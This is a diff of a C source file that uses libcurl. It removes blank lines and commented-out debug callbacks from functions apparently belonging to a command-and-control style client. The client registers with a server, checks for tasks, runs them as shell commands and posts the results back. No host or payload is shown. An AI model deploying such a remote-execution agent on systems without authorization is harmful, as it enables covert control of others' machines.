@@ -15,7 +15,6 @@ static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp);
 
 bool reg(void)
 {
-
 	struct response chunk = {.memory = NULL, .size = 0};
 
 	CURL *curl;
@@ -81,15 +80,11 @@ bool reg(void)
 
 		curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
 
-
-
 		// Send data to this function as opposed to writing to stdout.
 		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, mem_cb);
 
 		// Pass chunk to callback function.
 		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
-
-
 
 		// Perform the request, res will get the return code
 		res = curl_easy_perform(curl);
@@ -101,7 +96,6 @@ bool reg(void)
 			fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
 			return false;
 		}
-
 
 		// Always cleanup.
 		curl_easy_cleanup(curl);
@@ -205,33 +199,6 @@ bool check_tasks(void)
 	return 0;
 }
 
-
-// // The base of this code is in the "got_data" function in js_libcurl.c
-// size_t get_tasks(char *buffer, size_t itemsize, size_t nitems, void *ignorethis)
-// {
-// 	// Cast to void to get rid of compiler warnings.
-// 	(void)ignorethis;
-
-// 	// This computes the number of bytes that was received in the response body.
-// 	size_t bytes = itemsize * nitems;
-// 	int linenumber = 1;
-
-// 	printf("New chunk(%zu)\n", bytes);
-// 	printf("%d:\t", linenumber);
-
-// 	for (size_t i = 0; i < bytes; i++) {
-// 		printf("%c", buffer[i]);
-// 		if (buffer[i] == '\n') {
-// 			linenumber++;
-// 			// int this case each line number resets after each chunk of data.
-// 			printf("%d:\t", linenumber);
-// 		}
-// 	}
-// 	// This adds some separation between each chunk of data.
-// 	printf("\n\n");
-// 	return bytes;
-// }
-
 // Executes a given task.
 // ref: https://www.linuxquestions.org/questions/linux-newbie-8/
 // help-in-getting-return-status-of-popen-sys-call-870219/
@@ -267,7 +234,6 @@ bool run_cmd(struct strings_array *sa)
 	if (cmd_ret != 0) {
 		return false;
 	}
-
 
 	return true;
 }
@@ -345,9 +311,7 @@ bool post_results(struct strings_array *sa)
 			return false;
 		}
 
-
 		add_curl_field(form, "task id", "1234");
-
 
 		add_curl_field(form, "task results", sa->words);
 
@@ -373,8 +337,6 @@ bool post_results(struct strings_array *sa)
 		// Pass chunk to callback function.
 		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
 
-
-
 		// Perform the request, res will get the return code
 		res = curl_easy_perform(curl);
 
@@ -385,7 +347,6 @@ bool post_results(struct strings_array *sa)
 			fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
 			return false;
 		}
-
 
 		// Always cleanup.
 		curl_easy_cleanup(curl);
@@ -401,53 +362,3 @@ bool post_results(struct strings_array *sa)
 		return true;
 	}
 }
-
-
-// // The base of this code is in the "got_data" function in js_libcurl.c
-// char  *get_uuid(char *buffer, size_t itemsize, size_t nitems, void* ignorethis)
-// {   
-//     // This computes the number of bytes that was received in the response body.
-//     size_t bytes = itemsize * nitems;
-//     int linenumber = 1;
-
-//     printf("New chunk(%zu)\n", bytes);
-//     printf("%d:\t", linenumber);
-
-//     for (int i = 0; i < bytes; i++) {
-//         printf("%c", buffer[i]);
-//         if (buffer[i] == '\n') {
-//             linenumber++;
-//             // int this case each line number resets after each chunk of data.
-//             printf("%d:\t", linenumber);
-//         }
-//     }
-//     // This adds some separation between each chunk of data.
-//     printf("\n\n");
-//     return bytes;
-// }
-
-// // The base of this code is in the "got_data" function in js_libcurl.c
-// size_t is_registered(char *buffer, size_t itemsize, size_t nitems,
-// 		     void *ignorethis)
-// {
-// 	// This computes the number of bytes that was received in the response body.
-// 	size_t bytes = itemsize * nitems;
-// 	int linenumber = 1;
-// 	const char *resp_code = "201";
-// 	strstr(buffer, resp_code);
-
-// 	printf("New chunk(%zu)\n", bytes);
-// 	printf("%d:\t", linenumber);
-// 	printf("%s\n", buffer);
-// 	// for (int i = 0; i < bytes; i++) {
-// 	//     printf("%c", buffer[i]);
-// 	//     if (buffer[i] == '\n') {
-// 	//         linenumber++;
-// 	//         // int this case each line number resets after each chunk of data.
-// 	//         printf("%d:\t", linenumber);
-// 	//     }
-// 	// }
-// 	// This adds some separation between each chunk of data.
-// 	printf("\n\n");
-// 	return bytes;
-// }
